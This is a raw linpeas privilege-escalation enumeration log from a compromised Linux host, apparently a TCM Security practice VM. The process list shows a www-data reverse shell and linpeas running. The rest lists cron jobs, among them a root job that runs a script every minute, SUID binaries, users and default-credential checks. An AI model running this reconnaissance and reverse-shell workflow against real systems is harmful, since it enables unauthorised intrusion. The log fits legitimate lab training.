root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc
-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile
-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                        
   270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml
   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml
   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml
   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml
   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml
   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml
   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist
   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig
   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml
   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock
   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock
   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             
-rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 
/dev/mqueue                                                                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/lib/phpmyadmin
/var/lib/phpmyadmin/tmp
/var/lib/phpmyadmin/tmp/twig
/var/lib/phpmyadmin/tmp/twig/15
/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php
/var/lib/phpmyadmin/tmp/twig/21
/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php
/var/lib/phpmyadmin/tmp/twig/22
/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php
/var/lib/phpmyadmin/tmp/twig/28
/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php
/var/lib/phpmyadmin/tmp/twig/2e
/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php
/var/lib/phpmyadmin/tmp/twig/31
/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php
/var/lib/phpmyadmin/tmp/twig/36
/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php
/var/lib/phpmyadmin/tmp/twig/3b
/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php
/var/lib/phpmyadmin/tmp/twig/41
/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php
/var/lib/phpmyadmin/tmp/twig/42
/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php
/var/lib/phpmyadmin/tmp/twig/43
/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php
/var/lib/phpmyadmin/tmp/twig/4c
/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php
/var/lib/phpmyadmin/tmp/twig/4e
/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php
/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php
/var/lib/phpmyadmin/tmp/twig/4f
/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php
/var/lib/phpmyadmin/tmp/twig/53
/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php
/var/lib/phpmyadmin/tmp/twig/5c
/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php
/var/lib/phpmyadmin/tmp/twig/61
/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php
/var/lib/phpmyadmin/tmp/twig/6b
/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php
/var/lib/phpmyadmin/tmp/twig/6c
/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php
/var/lib/phpmyadmin/tmp/twig/73
/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php
/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php
/var/lib/phpmyadmin/tmp/twig/78
/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php
/var/lib/phpmyadmin/tmp/twig/7d
/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php
/var/lib/phpmyadmin/tmp/twig/7f
/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php
/var/lib/phpmyadmin/tmp/twig/8a
/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php
/var/lib/phpmyadmin/tmp/twig/8b
/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php
/var/lib/phpmyadmin/tmp/twig/96
/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php
/var/lib/phpmyadmin/tmp/twig/97
/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php
/var/lib/phpmyadmin/tmp/twig/99
/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php
/var/lib/phpmyadmin/tmp/twig/9d
/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php
/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php
/var/lib/phpmyadmin/tmp/twig/9e
/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php
/var/lib/phpmyadmin/tmp/twig/a0
/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php
/var/lib/phpmyadmin/tmp/twig/a4
/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php
/var/lib/phpmyadmin/tmp/twig/a7
/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php
/var/lib/phpmyadmin/tmp/twig/ae
/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php
/var/lib/phpmyadmin/tmp/twig/af
/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php
/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php
/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php
/var/lib/phpmyadmin/tmp/twig/b6
/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php
/var/lib/phpmyadmin/tmp/twig/c3
/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php
/var/lib/phpmyadmin/tmp/twig/c5
/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php
/var/lib/phpmyadmin/tmp/twig/c7
/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php
/var/lib/phpmyadmin/tmp/twig/ca
/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php
/var/lib/phpmyadmin/tmp/twig/d6
/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php
/var/lib/phpmyadmin/tmp/twig/dd
/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php
/var/lib/phpmyadmin/tmp/twig/e8
/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php
/var/lib/phpmyadmin/tmp/twig/e9
/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php
/var/lib/phpmyadmin/tmp/twig/f5
/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php
/var/lib/phpmyadmin/tmp/twig/fa
